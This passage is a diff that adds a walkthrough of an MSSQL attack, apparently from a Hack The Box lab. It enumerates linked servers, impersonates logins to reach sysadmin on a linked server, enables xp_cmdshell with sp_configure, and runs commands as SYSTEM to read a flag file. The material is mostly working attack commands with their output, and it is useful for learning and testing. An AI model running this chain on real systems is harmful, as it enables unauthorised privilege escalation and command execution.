@@ -1077,3 +1077,198 @@ sa
 
 (1 rows affected)
 ```
+
+## Identify Linked Servers in MSSQL
+
+```sql
+SELECT srvname, isremote FROM sysservers
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+(2 rows affected)
+```
+
+The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers
+
+```sql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+(1 rows affected)
+```
+
+# MSSQL - Walkthrough
+
+## Existing Databases
+
+```SQL
+> SELECT name FROM sys.databases;
+name
+---------
+master
+tempdb
+model
+msdb
+TestingDB
+TestAppDB
+```
+
+## USER
+
+```sql
+SQL (WIN-HARD\Fiona  guest@master)> SELECT SYSTEM_USER;
+--------------
+WIN-HARD\Fiona
+
+SQL (WIN-HARD\Fiona  guest@master)> SELECT CURRENT_USER;
+-----
+guest
+
+SQL (WIN-HARD\Fiona  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
+-
+0
+```
+
+## Command Execution
+
+```sql
+SQL (WIN-HARD\Fiona  guest@master)> xp_cmdshell
+ERROR(WIN-HARD\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
+```
+
+## Impersonate Other Users
+
+```sql
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+name
+-----
+john
+
+simon
+```
+
+```SQL
+SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'simon'
+SQL (simon  guest@master)> SELECT SYSTEM_USER
+-----
+simon
+
+SQL (simon  guest@master)> SELECT CURRENT_USER
+-----
+guest
+
+SQL (simon  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
+-
+0
+
+SQL (simon  guest@master)> REVERT
+```
+
+```SQL
+SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'john'
+SQL (john  guest@master)> SELECT SYSTEM_USER
+----
+john
+
+SQL (john  guest@master)> SELECT CURRENT_USER
+-----
+guest
+
+SQL (john  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
+-
+0
+
+SQL (john  guest@master)> REVERT
+SQL (WIN-HARD\Fiona  guest@master)
+```
+
+## Linked Servers
+
+```SQL
+> SELECT srvname, isremote FROM sysservers
+srvname                 isremote
+---------------------   --------
+WINSRV02\SQLEXPRESS            1
+
+LOCAL.TEST.LINKED.SRV          0
+```
+
+## Enumerate At Linked Servers
+
+```SQL
+EXEC ('SELECT SYSTEM_USER') AT [WINSRV02\SQLEXPRESS]
+INFO(WIN-HARD\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "WINSRV02\SQLEXPRESS" returned message "Login timeout expired".
+INFO(WIN-HARD\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "WINSRV02\SQLEXPRESS" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
+ERROR(MSOLEDBSQL): Line 0: SQL Server Network Interfaces: Error Locating Server/Instance Specified [xFFFFFFFF].
+SQL (WIN-HARD\Fiona  guest@master)>
+
+
+SQL (WIN-HARD\Fiona  guest@master)> EXEC ('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV]
+ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'.
+```
+
+## Impersonate At Linked Servers
+
+```SQL
+> EXECUTE AS LOGIN = 'simon'
+SQL (simon  guest@master)> EXEC ('SELECT CURRENT_USER') AT [LOCAL.TEST.LINKED.SRV]
+ERROR(WIN-HARD\SQLEXPRESS): Line 1: Linked servers cannot be used under impersonation without a mapping for the impersonated login.
+```
+
+```SQL
+> EXECUTE AS LOGIN = 'john'
+SQL (john  guest@master)> EXEC('SELECT CURRENT_USER') AT [LOCAL.TEST.LINKED.SRV]
+---
+dbo
+
+SQL (john  guest@master)> EXEC('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV]
+---------
+testadmin
+
+SQL (john  guest@master)> EXEC('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+-
+1
+```
+
+## Cmd Execution At Linked Server
+
+```SQL
+> EXEC('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+ERROR(WIN-HARD\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+```
+
+```SQL
+> EXEC('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+ERROR(WIN-HARD\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+SQL (john  guest@master)>
+SQL (john  guest@master)> EXEC('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (john  guest@master)> EXEC('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+SQL (john  guest@master)>
+SQL (john  guest@master)> EXEC('sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV]
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (john  guest@master)> EXEC('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+```
+
+```SQL
+> EXEC('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+output
+-------------------
+nt authority\system
+
+NULL
+
+> EXEC('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+output
+---------------------------
+HTB{46u$!n9_l!nk3d_$3rv3r$}
+
+NULL
+```
+
